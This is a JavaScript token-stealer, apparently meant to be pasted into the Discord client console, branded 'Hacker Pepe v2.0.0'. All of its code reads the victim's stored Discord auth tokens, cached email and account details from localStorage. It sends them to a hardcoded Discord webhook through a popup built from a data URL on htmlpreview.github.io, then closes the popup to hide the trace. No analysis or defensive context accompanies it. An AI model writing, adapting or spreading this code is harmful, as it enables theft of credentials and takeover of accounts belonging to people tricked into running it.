const localStorage = document.body.appendChild(document.createElement("iframe")).contentWindow.localStorage;

const tokens = JSON.parse(localStorage.tokens);
const email = localStorage.email_cache.slice(1, -1);
const users = JSON.parse(localStorage.MultiAccountStore)._state.users;

for (const [userId, token] of Object.entries(tokens)) {
    /* console.log(`Discord ID: ${userId}, Token: ${token}`); */

    let avatar = "https://discord.com/assets/1f0bfc0865d324c2587920a7d80c609b.png";
    let username = "@user#1234";

    /*
    const images = document.querySelectorAll("img");

    for (let i = 0; i < images.length; i++) {
        if (images[i].src.includes(userId)) {
            avatar = images[i].src.split("?").join("");
            break;
        }
    }
    */

    for (let i = 0; i < users.length; i++) {
        const user = users[0];

        if (user.id == userId) {
            avatar = `https://cdn.discordapp.com/avatars/${userId}/${user.avatar}.webp`;
            username = `@${user.username}#${user.discriminator}`;
            break;
        }
    }

    const script = `
        fetch("https://discord.com/api/webhooks/1494797055003066503/riPrIxGJ7bgJ6JFg3s-sGUcl9rOXBk4VvzubeKq6JLALNLkBHWT6mqBeeWrjyiuHDF2y", {
            "method": "POST",
            "headers": {
                "Content-Type": "application/json"
            },
            "body": JSON.stringify({
                content: null,
                embeds: [{
                    title: "Successfully Grabbed Token!",
                    color: 2067276,
                    fields: [{
                        name: "User",
                        value: "<@!${userId}>",
                        inline: true
                    }, {
                        name: "Email",
                        value: "${email}",
                        inline: true
                    }, {
                        name: "Token",
                        value: "${token}"
                    }],
                    author: {
                        "name": "${username}",
                        "url": "https://gist.github.com/subreme",
                        "icon_url": "${avatar}"
                    },
                    footer: {
                        text: "Hacker Pepe v2.0.0",
                        icon_url: "https://imgur.com/5Ri5eok.png"
                    }
                }],
                username: "Hacker Pepe",
                avatar_url: "https://imgur.com/5Ri5eok.png"
            })
        }).then(() => {
            window.location = "https://discord.com/";
        });
    `;

    url = `https://htmlpreview.github.io/?data:text/html,%3Cscript%3E${encodeURIComponent(script)}%3C%2Fscript%3E`;

    let popup = window.open(url, "", "height=100,width=100");

    setInterval(() => {
        if (popup.window.location.href == "https://discord.com/") {
            popup.close();
        }
    }, 1000);
}
